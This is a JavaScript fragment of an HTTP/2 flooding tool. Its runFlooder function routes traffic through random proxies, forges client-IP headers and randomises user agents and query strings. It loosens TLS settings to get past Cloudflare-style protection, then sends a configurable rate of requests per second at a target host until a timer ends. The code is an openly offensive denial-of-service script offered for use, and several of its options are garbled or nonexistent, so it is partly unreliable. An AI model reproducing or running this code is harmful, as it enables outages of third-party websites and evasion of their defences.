headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
headers["origin"] = parsedTarget.host;
headers["Content-Type"] = randomHeaders['Content-Type'];
headers[":scheme"] = "https";
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
headers["accept"] = randomHeaders['accept'];
headers["accept-language"] = randomHeaders['accept-language'];
headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
headers["accept-encoding"] = randomHeaders['accept-encoding'];
headers["cache-control"] = randomHeaders['cache-control'];
headers["x-frame-options"] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
headers["x-content-type-options"] = "nosniff";
headers["TE"] = "trailers";
headers["pragma"] = randomHeaders['pragma'];
headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
headers["upgrade-insecure-requests"] = "1";
headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
headers["X-Forwarded-Proto"] = "https";
headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
headers["vary"] = randomHeaders['vary'];
headers["x-requested-with"] = "XMLHttpRequest";
headers["set-cookie"] = randomHeaders['set-cookie'] || randomCookie();
headers["Server"] = randomHeaders['Server'];
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
headers["alt-svc"] = randomHeaders['alt-svc'];
headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = "websocket";
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers["Referer"] = randomReferer;
headers["DNT"] = "1";  // Do Not Track
headers["Forwarded"] = "for=" + fakeIP;
headers["X-Requested-With"] = "XMLHttpRequest";
headers["X-Real-IP"] = fakeIP;
headers["X-Pingback"] = parsedTarget.host + "/pingback";
headers["X-Content-Duration"] = "10";  // Example duration
headers["X-Permitted-Cross-Domain-Policies"] = "none";  // Cross-domain policy

function randomCookie() {
    // Generate a random cookie string
    const cookieName = randomString(5);
    const cookieValue = randomString(10);
    return `${cookieName}=${cookieValue}; Path=/; HttpOnly;`;
}



function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const userAgentv2 = new UserAgent();
    var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = uap1;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

   setTimeout(function(){
     process.exit(1);
   }, process.argv[3] * 1000);
   
   process.on('uncaughtException', function(er) {
   });
   process.on('unhandledRejection', function(er) {
   });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
           ALPNProtocols: ['h2'],
           challengesToSolve: Infinity,
           resolveWithFullResponse: true,
           followAllRedirects: true,
           maxRedirects: 10,
           clientTimeout: 5000,
           clientlareMaxTimeout: 10000,
           cloudflareTimeout: 5000,
           cloudflareMaxTimeout: 30000,
           ciphers: tls.getCiphers().join(":") + cipper,
           secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
           servername: url.hostname,
           socket: connection,
           honorCipherOrder: true,
           secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
           sigals: concu,
           echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
           secure: true,
           Compression: false,
           rejectUnauthorized: false,
           port: 443,
           uri: parsedTarget.host,
           servername: parsedTarget.host,
           sessionTimeout: 5000,
       };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 20000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
   
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}


